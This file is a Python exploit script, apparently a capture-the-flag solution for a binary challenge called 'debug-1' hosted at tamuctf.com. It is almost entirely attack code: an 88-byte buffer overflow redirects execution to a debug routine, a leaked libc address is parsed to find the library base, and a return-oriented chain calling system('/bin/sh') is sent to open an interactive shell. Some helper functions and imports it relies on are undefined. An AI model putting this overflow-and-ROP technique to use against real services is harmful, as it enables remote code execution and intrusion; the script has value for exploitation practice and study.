#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

# context.log_level = 'debug'
exe = context.binary = ELF('./debug-1_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
# # b *0x401314
# # b *0x4011EC
# # b *0x4012C8
b *0x401464
b *0x4014AC
c
'''.format(**locals())

p = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_debug-1")

# ==================== EXPLOIT ====================

def choice(option: int):
    sl(f'{option}'.encode())

def exploit():

    pop_rdi = 0x40154b
    ret = pop_rdi + 1


    choice(1)
    s(b'A' * 88 + p64(exe.sym.debug + 1))

    choice(1)
    ru(b'libc leak: ')
    system = hexleak(rl())
    libc.address = system - libc.sym.system
    slog('system', system)
    slog('libc base', libc.address)

    offset = 0x68
    payload = flat({

        offset: [

            pop_rdi,
            next(libc.search(b'/bin/sh\0')),
            ret,
            system

        ]

    })

    sleep(0.5)
    s(payload)

    interactive()

if __name__ == '__main__':
    exploit()
